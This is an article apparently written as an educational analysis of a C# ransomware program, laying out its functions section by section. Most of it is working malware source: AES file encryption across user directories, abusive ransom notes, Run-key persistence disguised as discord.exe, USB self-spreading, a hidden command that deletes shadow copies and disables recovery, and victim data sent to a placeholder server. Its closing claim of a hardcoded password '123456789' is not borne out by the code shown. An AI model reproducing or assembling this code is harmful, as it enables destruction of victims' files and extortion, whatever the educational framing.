# Analysis of Malicious C# Ransomware Code 🕵️‍♂️

This article analyzes a malicious C# program exhibiting ransomware behavior, including file encryption, self-propagation, and system disruption. Each key functionality is explained with the full relevant source code. **Warning**: This code is harmful and illegal to deploy. This analysis is for educational purposes only to aid in understanding and mitigating such threats.

---

## 1. File Encryption 🔒

The program encrypts files in user directories using AES-256 in CBC mode, renaming them with a `.haha` extension. The `EncryptFile` method encrypts individual files, while `encryptDirectory` recursively processes directories.

### Code
```csharp
public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] result = null;
    byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
        }
        result = memoryStream.ToArray();
    }
    return result;
}

public void EncryptFile(string file, string password)
{
    try
    {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        bytes = SHA256.Create().ComputeHash(bytes);
        byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
        File.WriteAllBytes(file, bytes2);
        File.Move(file, file + ".haha");
        Console.WriteLine("encrypted: " + file + " >> " + file + ".haha");
        encryptedfiles = encryptedfiles + file + Environment.NewLine;
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public void encryptDirectory(string location, string password)
{
    try
    {
        string text = "si";
        string[] source = new string[1] { "//aqui_extensiones" };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string fileName = Path.GetFileName(files[i]);
            string extension = Path.GetExtension(files[i]);
            if (!(extension == ".haha") && !(fileName == "fuckugetencryptedbozo.txt"))
            {
                if (text == "si")
                {
                    EncryptFile(files[i], password);
                }
                else if (source.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
        }
        for (int i = 0; i < directories.Length; i++)
        {
            encryptDirectory(directories[i], password);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- **AES_Encrypt**: Implements AES-256 encryption with a static salt and PBKDF2 key derivation.
- **EncryptFile**: Reads a file, encrypts it with the provided password (hashed via SHA-256), and appends `.haha`.
- **encryptDirectory**: Recursively encrypts all files in a directory, excluding `.haha` files and ransom notes.

---

## 2. Ransom Note Creation 📝

The `mensaje` and `messageCreator` methods create ransom notes (`fuckugetencryptedbozo.txt`) in targeted directories, containing victim details and a taunting message.

### Code
```csharp
public void mensaje(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "suck my dick ur files r encrypted bitch %PERSONALID%  %USERNAME%  %COMPUTERNAME%  %DATE%   %PRIVATEIP%  %ENCRIPTEDFILES%".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < directories.Length; i++)
        {
            messageCreator(directories[i]);
        }
        File.WriteAllLines(location + "\\fuckugetencryptedbozo.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public void messageCreator(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "suck my dick ur files r encrypted bitch %PERSONALID%  %USERNAME%  %COMPUTERNAME%  %DATE%   %PRIVATEIP%  %ENCRIPTEDFILES%".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRIPTEDFILES%", encryptedfiles) };
        string[] directories = Directory.GetDirectories(location);
        File.WriteAllLines(location + "\\fuckugetencryptedbozo.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- Both methods create a text file with a provocative message, including the victim’s ID, username, computer name, date, IP address, and list of encrypted files.
- `mensaje` processes the root directory and calls `messageCreator` for subdirectories.
- The `nota_mostrar` flag controls whether the note is displayed.

---

## 3. Persistence 🛠️

The `inicio_void` method ensures the program runs on startup by copying itself to `%LocalAppData%\discord.exe` and adding a registry key.

### Code
```csharp
public void inicio_void()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string text = "";
    try
    {
        text = File.ReadAllText(folderPath + "\\uac_location");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
    registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
    if (text == "")
    {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
        {
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
        }
    }
    else if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
    {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
    }
    try
    {
        File.Delete(folderPath + "\\uac_location");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

### Explanation
- Copies the executable to `%LocalAppData%\discord.exe`, masquerading as the legitimate Discord application.
- Adds a registry entry to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` to run `discord.exe` on startup.
- Checks for a `uac_location` file to avoid redundant copying and deletes it afterward.

---

## 4. Self-Propagation (USB Spreading) 📀

The `USB` method creates a batch file to copy the executable to all available drive letters as `ABREME.exe`.

### Code
```csharp
public void USB()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\ABREME.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\ABREME.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\ABREME.exe" + Environment.NewLine + "exit";
    File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = folderPath + "\\usb_maker.bat";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    Process.Start(processStartInfo);
}
```

### Explanation
- Generates a batch file (`usb_maker.bat`) in `%AppData%` that copies the executable to drives A: through Z: as `ABREME.exe`.
- Runs the batch file hidden to spread the malware to removable drives.

---

## 5. System Disruption 🛑

The program disrupts recovery by emptying the Recycle Bin and deleting system backups. The `borrar` method executes commands to remove Volume Shadow Copies and disable recovery options.

### Code
```csharp
[DllImport("shell32.dll")]
private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

public void borrar()
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
    Process.Start(processStartInfo);
}

// In start() method:
SHEmptyRecycleBin(IntPtr.Zero, Environment.GetFolderPath(Environment.SpecialFolder.Windows).Replace("windows", "").Replace("WINDOWS", "")
    .Replace("Windows", ""), 7u);
```

### Explanation
- **SHEmptyRecycleBin**: Permanently empties the Recycle Bin with flags for no confirmation, no progress UI, and no sound.
- **borrar**: Runs commands to delete shadow copies, disable recovery, and clear the backup catalog, hindering system restore.

---

## 6. Wallpaper Change 🖼️

The `fondo` and `fond2` methods change the desktop wallpaper to an embedded or specified image.

### Code
```csharp
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

public static void fondo()
{
    try
    {
        File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
        random = CreateId(30);
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        if (File.Exists(folderPath + "\\image.jpg"))
        {
            SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
            File.Delete(folderPath + "\\image.jpg");
        }
        else
        {
            File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
            SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
            File.Delete(folderPath + "\\image" + random + ".jpg");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
    }
}

public void fond2(string path)
{
    fondo();
}
```

### Explanation
- Backs up the current wallpaper to `%AppData%\fondo_antiguo.jpg`.
- Sets a new wallpaper from `%MyPictures%\image.jpg` or an embedded resource (`Resources.wallpaper_jpg`) with a random name.
- Deletes the temporary wallpaper file after setting it.

---

## 7. Network Communication 🌐

The `conectar` method sends victim information to a remote server and checks if the victim’s ID is already registered.

### Code
```csharp
public static void conectar()
{
    try
    {
        string text = "https://example.com/";
        Console.WriteLine("string enlace creado");
        Console.WriteLine("string informacion creado");
        string address = text + "data.php?info=" + ((Control)Program.text).Text;
        Console.WriteLine("strings fusionados");
        WebClient webClient = new WebClient();
        Console.WriteLine("webclient creado");
        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        Console.WriteLine("webclient headers");
        Stream stream = webClient.OpenRead(text + "data.txt");
        Console.WriteLine("data");
        StreamReader streamReader = new StreamReader(stream);
        Console.WriteLine("reader");
        string text2 = streamReader.ReadToEnd();
        Console.WriteLine("s");
        stream.Close();
        Console.WriteLine("data close");
        streamReader.Close();
        Console.WriteLine("reader close");
        if (text2.Contains(ID))
        {
            Console.WriteLine("ID ya en el servidor");
            return;
        }
        string text3 = new WebClient().DownloadString(address);
        Console.WriteLine("enviado");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
        conectar();
    }
}
```

### Explanation
- Sends victim data (ID, username, PC name, date, IP, status) to `https://example.com/data.php`.
- Checks `data.txt` to avoid duplicate submissions.
- Retries on failure, indicating persistent C2 communication.

---

## 8. Self-Deletion 🗑️

The `autodestruir` method deletes the original executable and a file specified in `uac_location`.

### Code
```csharp
public void autodestruir()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string text = File.ReadAllText(folderPath + "\\uac_location");
    string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(location);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
    Process.Start(processStartInfo);
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
    processStartInfo2.FileName = "cmd.exe";
    processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
    Process.Start(processStartInfo2);
}
```

### Explanation
- Uses `cmd.exe` to delete the executable and a file listed in `%AppData%\uac_location`.
- Runs commands hidden to avoid user detection.

---

## 9. System Tray Notification 🔔

The program creates a system tray icon with a balloon tip notification.

### Code
```csharp
// In start() method:
NotifyIcon val = new NotifyIcon();
val.Visible = true;
val.Icon = SystemIcons.Asterisk;
val.BalloonTipText = "notmen";
val.BalloonTipTitle = "titmen";
```

### Explanation
- Creates a `NotifyIcon` with an asterisk icon.
- Displays a balloon tip with placeholder text (`notmen`) and title (`titmen`).

---

## 10. Miscellaneous Functions ⚙️

Additional functions include generating a victim ID, hiding the console, and displaying a promotional message.

### Code
```csharp
public static string CreateId(int length)
{
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    while (0 < length--)
    {
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZMTIzNDU2Nzg50"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZMTIzNDU2Nzg50".Length)]);
    }
    return stringBuilder.ToString();
}

[DllImport("user32.dll")]
private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

// In Main():
ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);

public void cmd2()
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
    Process.Start(processStartInfo);
}
```

### Explanation
- **CreateId**: Generates a random string for the victim ID.
- **ShowWindow**: Hides the console window using `SW_HIDE` (0).
- **cmd2**: Displays a GitHub link in a hidden command prompt and opens it in a browser.

---

## Ethical and Legal Notes ⚖️

- **Warning**: Deploying this code is illegal and harmful. It encrypts files, spreads to other systems, and disrupts recovery.
- **Purpose**: This analysis is for cybersecurity education to understand and mitigate ransomware.
- **Mitigation**:
  - Use antivirus software to detect and remove the malware.
  - Maintain offline backups to recover encrypted files.
  - Monitor and block suspicious network traffic.
  - Disable USB autorun and restrict registry access.

---

## Conclusion 🎯

This ransomware employs encryption, persistence, propagation, and disruption tactics to harm victims. Its hardcoded password (`123456789`) allows decryption if caught early. For further analysis, use sandbox environments and tools like IDA Pro or Wireshark. If affected, consult a cybersecurity professional.